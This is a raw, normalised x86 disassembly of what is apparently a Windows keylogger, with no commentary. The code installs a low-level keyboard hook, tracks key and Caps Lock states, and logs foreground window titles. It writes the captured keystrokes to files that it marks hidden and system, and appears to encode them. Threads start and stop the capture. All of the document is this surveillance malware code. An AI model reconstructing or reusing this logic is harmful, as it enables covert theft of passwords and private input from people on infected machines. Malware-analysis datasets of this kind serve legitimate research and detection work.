call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop esi
pop ebp
retn 0x10
push eax
push eax
push esi
push sub_40381b
push eax
push eax
call [ CreateThread@IAT ]
sub_403877
push ebp
mov ebp esp
sub esp 0x1c
push esi
push edi
mov esi ecx
xor edi edi
mov [ rw-data ] esi
cmp [ esi ] edi
jne r-xdata
mov esi [ GetMessageA@IAT ]
push edi
push edi
lea eax [ ebp - 0x1c ]
push edi
push eax
push edi
push edi
call [ GetModuleHandleA@IAT ]
push eax
push sub_40385c
push 0xd
call [ SetWindowsHookExA@IAT ]
mov [ esi ] eax
pop edi
xor eax eax
pop esi
leave
retn
lea eax [ ebp - 0x1c ]
push eax
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
push edi
push edi
lea eax [ ebp - 0x1c ]
push edi
push eax
jmp r-xdata
call esi
test eax eax
je r-xdata
sub_4038db
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
push edi
push 0x5
lea edi [ ebx + 0x3c ]
pop ecx
[ edi ] [ esi ]
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebx ]
call [ CallNextHookEx@IAT ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax [ ebp + 0x10 ]
sub eax 0x100
je r-xdata
mov esi [ GetKeyState@IAT ]
push 0x14
call esi
test ax ax
je r-xdata
dec eax
je r-xdata
and [ ebx + 0x2c ] 0x0
push 0x14
call esi
cmp ax 0xff80
je r-xdata
mov ecx ebx
call sub_4050c6
mov ecx ebx
call sub_4050ea
mov ecx ebx
call sub_40506e
jmp r-xdata
sub eax 0x3
jne r-xdata
and [ ebx + 0x2f ] 0x0
mov ecx ebx
call sub_404e5f
mov [ ebx + 0x2c ] 0x1
jmp r-xdata
mov ecx ebx
call sub_404fde
jmp r-xdata
mov ecx ebx
call sub_4050b4
mov ecx ebx
call sub_4050d8
mov ecx ebx
call sub_4043bf
cmp [ ebx + 0x2f ] 0x0
jne r-xdata
sub_403988
push ebp
mov ebp esp
sub esp 0x420
push ebx
mov ebx [ Sleep@IAT ]
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi rw-data
lea eax [ ebp - 0x1 ]
push r--data
push eax
lea eax [ ebp - 0x420 ]
push eax
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x38 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x18 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
mov edi [ ebp - 0x8 ]
add esp 0xc
push eax
lea ecx [ edi + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ edi + 0x50 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx edi
call sub_403774
push 0x3e8
call ebx
jmp r-xdata
mov ecx edi
call sub_404388
jmp r-xdata
push 0x3e8
call ebx
jmp r-xdata
lea eax [ ebp - 0x420 ]
mov ecx esi
push eax
push 0x2a
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40f4a3
add esp 0x14
test al al
jne r-xdata
and [ ebp - 0x420 ] 0x0
mov ecx 0xf9
xor eax eax
lea edi [ ebp - 0x41f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x0
push 0x2a
mov ecx esi
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40f4a3
add esp 0x14
test al al
je r-xdata
sub_403a9a
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x38 ] 0x0
je r-xdata
cmp [ esi + 0x39 ] 0x0
je r-xdata
lea eax [ ebp + 0x8 ]
lea ecx [ esi + 0x4 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
mov al [ ebp + 0x18 ]
lea ecx [ ebp + 0x8 ]
mov [ esi + 0x2f ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop esi
pop ebp
retn 0x14
lea eax [ ebp + 0x8 ]
lea ecx [ esi + 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
push [ esi + 0x30 ]
call [ SetEvent@IAT ]
sub_403ae3
push ebp
mov ebp esp
sub esp 0x604
push ebx
mov ebx ecx
push esi
push edi
mov [ ebp - 0x8 ] ebx
lea esi [ ebx + 0x4 ]
cmp [ ebx + 0x38 ] 0x0
jne r-xdata
lea edi [ ebx + 0x50 ]
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ GetFileAttributesA@IAT ]
test al 0x2
je r-xdata
push 0x2710
call [ Sleep@IAT ]
push r--data
push esi
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
leave
retn
push 0x12
mov ecx rw-data
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x0
jne r-xdata
push 0x80
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ SetFileAttributesA@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x18 ]
push eax
xor ebx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov esi rw-data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
lea ecx [ ebp - 0x604 ]
call sub_4028eb
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_40f44c
test al al
pop ecx
je r-xdata
push 0x1
push 0xa
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x1f8 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::basic_ofstream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ ebp - 0x1f8 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::is_open@IAT ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
lea ecx [ ebp - 0x18 ]
lea esi [ eax + 0x4 ]
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x604 ]
call sub_402a2a
push 0x1
push 0x32
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x16c ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::basic_ofstream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ ebp - 0x16c ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::is_open@IAT ]
test al al
je r-xdata
push 0x1
push 0x25
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0xc8 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::basic_ifstream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ ebp - 0xc8 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::is_open@IAT ]
test al al
je r-xdata
lea ecx [ ebp - 0x1f8 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
jmp r-xdata
lea eax [ ebp - 0x1f8 ]
push esi
push eax
call ??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
pop ecx
pop ecx
lea ecx [ ebp - 0x1f8 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::close@IAT ]
push ebx
call [ free@IAT ]
pop ecx
lea ecx [ ebp - 0x16c ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ebx [ ebp - 0x8 ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x16c ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
lea ecx [ ebp - 0x16c ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::close@IAT ]
lea ecx [ ebp - 0xc8 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea eax [ ebp - 0xe0 ]
lea ecx [ ebp - 0xc8 ]
push eax
call [ std::basic_istream<char,struct std::char_traits<char> >::tellg@IAT ]
mov ecx eax
call sub_405288
mov esi eax
push esi
call [ malloc@IAT ]
pop ecx
mov ebx eax
push 0x0
push 0x0
lea ecx [ ebp - 0xc8 ]
call [ std::basic_istream<char,struct std::char_traits<char> >::seekg@IAT ]
push esi
push ebx
lea ecx [ ebp - 0xc8 ]
call [ std::basic_istream<char,struct std::char_traits<char> >::read@IAT ]
lea ecx [ ebp - 0xc8 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::close@IAT ]
push esi
lea eax [ ebp - 0x38 ]
push ebx
push eax
lea ecx [ ebp - 0x604 ]
call sub_402a2a
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push 0x13
mov ecx rw-data
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x0
je r-xdata
push 0x6
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ SetFileAttributesA@IAT ]
sub_403d9a
push ebp
mov ebp esp
sub esp 0x53c
push ebx
push esi
mov ebx ecx
lea eax [ ebp - 0x5 ]
push edi
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push r--data
push r--data
jmp r-xdata
sub esp 0x10
add ebx 0x70
mov edi esp
mov esi rw-data
push ebx
push esi
lea eax [ ebp - 0x18 ]
push esi
push eax
lea eax [ ebp - 0x28 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x48 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0xa0 ]
call sub_402198
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xa0 ]
call sub_4021c7
push 0x1
push 0x25
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x130 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::basic_ifstream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ ebp - 0x130 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::is_open@IAT ]
test al al
je r-xdata
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push 0x1
lea ecx [ ebp - 0xa0 ]
call sub_4020e1
sub esp 0x10
mov esi rw-data
mov edi esp
lea ecx [ ebp - 0xa0 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_402168
lea esi [ ebx + 0x50 ]
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::empty@IAT ]
test al al
jne r-xdata
lea ecx [ ebp - 0x130 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea eax [ ebp - 0x50 ]
lea ecx [ ebp - 0x130 ]
push eax
call [ std::basic_istream<char,struct std::char_traits<char> >::tellg@IAT ]
mov ecx eax
call sub_405288
mov edi eax
push edi
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x4 ] eax
push 0x0
push 0x0
lea ecx [ ebp - 0x130 ]
call [ std::basic_istream<char,struct std::char_traits<char> >::seekg@IAT ]
push edi
lea ecx [ ebp - 0x130 ]
push [ ebp - 0x4 ]
call [ std::basic_istream<char,struct std::char_traits<char> >::read@IAT ]
lea ecx [ ebp - 0x130 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::close@IAT ]
push 0x12
mov ecx rw-data
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x1
jne r-xdata
sub esp 0x10
lea eax [ ebx + 0x70 ]
mov ebx esp
mov esi rw-data
push eax
lea eax [ ebp + 0xb ]
push esi
push eax
push edi
lea ecx [ ebp - 0x38 ]
push [ ebp - 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x18 ]
push esi
push eax
lea eax [ ebp - 0x60 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x28 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x48 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0xa0 ]
call sub_402198
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x60 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
mov esi rw-data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
lea ecx [ ebp - 0x53c ]
call sub_4028eb
push edi
lea eax [ ebp - 0x38 ]
push [ ebp - 0x4 ]
lea ecx [ ebp - 0x53c ]
push eax
call sub_402a2a
sub esp 0x10
add ebx 0x70
mov edi esp
mov esi rw-data
push ebx
lea eax [ ebp - 0x38 ]
push esi
push eax
lea eax [ ebp - 0x18 ]
push esi
push eax
lea eax [ ebp - 0x48 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x28 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x60 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0xa0 ]
call sub_402198
lea ecx [ ebp - 0x60 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
jmp r-xdata
lea ecx [ ebp - 0xa0 ]
call sub_4021d6
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0x4
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ ebp - 0x4 ]
call sub_40fc2c
pop ecx
lea ecx [ ebp - 0xa0 ]
call sub_4021c7
lea ecx [ ebp - 0x130 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
jmp r-xdata
sub_404077
push ebp
mov ebp esp
sub esp 0x58
push ebx
mov ebx [ Sleep@IAT ]
push esi
push edi
mov [ ebp - 0x8 ] ecx
test [ rw-data ] 0x1
jne r-xdata
cmp [ eax + 0x39 ] 0x0
je r-xdata
push 0x1f4
call ebx
call [ GetForegroundWindow@IAT ]
mov edi eax
push edi
call [ GetWindowTextLengthA@IAT ]
mov esi eax
lea eax [ ebp - 0x2 ]
push eax
push 0x0
lea eax [ esi + 0x1 ]
lea ecx [ ebp - 0x28 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
test esi esi
je r-xdata
or [ rw-data ] 0x1
lea eax [ ebp - 0x1 ]
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ
call sub_40fcba
pop ecx
pop edi
pop esi
xor eax eax
pop ebx
leave
retn
mov edi [ ebp - 0x8 ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push edi
call [ GetWindowTextA@IAT ]
lea eax [ ebp - 0x28 ]
push rw-data
push eax
call [ std::operator==@IAT ]
pop ecx
test al al
pop ecx
jne r-xdata
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
cmp [ edi + 0x38 ] 0x0
jne r-xdata
lea eax [ ebp - 0x28 ]
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
dec eax
lea ecx [ ebp - 0x28 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::resize@IAT ]
push 0x0
lea eax [ ebp - 0x28 ]
sub esp 0x10
mov esi esp
push r--data
push eax
lea eax [ ebp - 0x38 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
mov edi [ ebp - 0x8 ]
add esp 0xc
mov ecx edi
call sub_403a9a
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
call sub_40e898
cmp eax esi
jb r-xdata
cmp [ edi + 0x39 ] 0x0
je r-xdata
mov ecx edi
call sub_405142
call sub_40e898
mov esi 0xea60
cmp eax esi
jb r-xdata
lea eax [ ebp - 0x18 ]
push 0xa
push eax
mov eax [ ebp - 0xc ]
xor edx edx
div esi
push eax
call [ _itoa@IAT ]
add esp 0xc
lea eax [ ebp - 0x3 ]
lea ecx [ ebp - 0x58 ]
push 0x0
sub esp 0x10
mov esi esp
push r--data
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x48 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx edi
call sub_403a9a
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x3e8
mov [ ebp - 0xc ] eax
call ebx
jmp r-xdata
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40425f
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ esi + 0x39 ] bl
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x38 ] bl
push edi
mov edi [ CreateThread@IAT ]
jne r-xdata
push ebx
push ebx
push esi
push sub_40384a
push ebx
push ebx
call edi
mov [ esi + 0x28 ] eax
pop edi
call sub_40374a
cmp [ esi ] ebx
jne r-xdata
push ebx
push ebx
push esi
push sub_40383b
push ebx
push ebx
call edi
push ebx
push ebx
push esi
push sub_40380c
push ebx
push ebx
call edi
sub_4042aa
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
xor eax eax
push edi
push eax
mov esi ecx
push eax
push eax
push eax
mov [ esi + 0x39 ] 0x1
call [ CreateEventA@IAT ]
mov [ esi + 0x30 ] eax
lea ebx [ esi + 0x14 ]
mov edi r--data
push 0xffffffff
push [ esi + 0x30 ]
call [ WaitForSingleObject@IAT ]
jmp r-xdata
sub esp 0x10
lea eax [ ebp - 0x14 ]
mov edx esp
push ebx
push rw-data
push r--data
push eax
mov [ ebp - 0x4 ] edx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
mov eax [ ebp - 0x4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
call sub_402198
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ebx [ esi + 0x14 ]
push edi
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push edi
push ebx
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
sub_404336
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
cmp [ esi + 0x39 ] bl
je r-xdata
xor al al
mov edi [ TerminateThread@IAT ]
push ebx
push [ esi + 0x28 ]
call edi
cmp eax 0x1
jne r-xdata
push [ esi + 0x30 ]
mov [ esi + 0x39 ] bl
mov [ esi + 0x28 ] ebx
call [ CloseHandle@IAT ]
cmp [ esi + 0x38 ] bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ esi ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
push eax
call [ UnhookWindowsHookEx@IAT ]
push ebx
push sub_40380c
mov [ esi ] ebx
call edi
sub_404388
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ esi + 0x38 ] bl
je r-xdata
xor al al
cmp [ esi + 0x39 ] bl
mov [ esi + 0x38 ] bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ esi ]
cmp eax ebx
je r-xdata
pop esi
pop ebx
retn
push eax
call [ UnhookWindowsHookEx@IAT ]
push ebx
push sub_40380c
call [ TerminateThread@IAT ]
mov [ esi ] ebx
sub_4043bf
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
mov esi ecx
push edi
push 0x1
mov eax [ esi + 0x3c ]
pop ebx
cmp eax 0x2c
ja r-xdata
cmp eax 0x75
ja r-xdata
je r-xdata
sub eax 0x76
je r-xdata
je r-xdata
push ebx
lea eax [ ebp - 0xe ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
cmp eax 0x22
ja r-xdata
push ebx
lea eax [ ebp - 0x1b ]
sub esp 0x10
mov ecx esp
push eax
push r--data
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x15 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub eax 0x2e
je r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_403a9a
sub eax 0x23
je r-xdata
je r-xdata
cmp [ esi + 0x34 ] 0x10
mov ecx [ esi + 0x3c ]
mov eax 0xba
jne r-xdata
cmp [ esi + 0x34 ] 0x10
mov eax [ esi + 0x3c ]
jne r-xdata
push ebx
lea eax [ ebp - 0x1a ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
dec eax
je r-xdata
push ebx
lea eax [ ebp - 0x14 ]
sub esp 0x10
mov ecx esp
push eax
push r--data
jmp r-xdata
sub eax 0x42
je r-xdata
push ebx
lea eax [ ebp - 0xd ]
sub esp 0x10
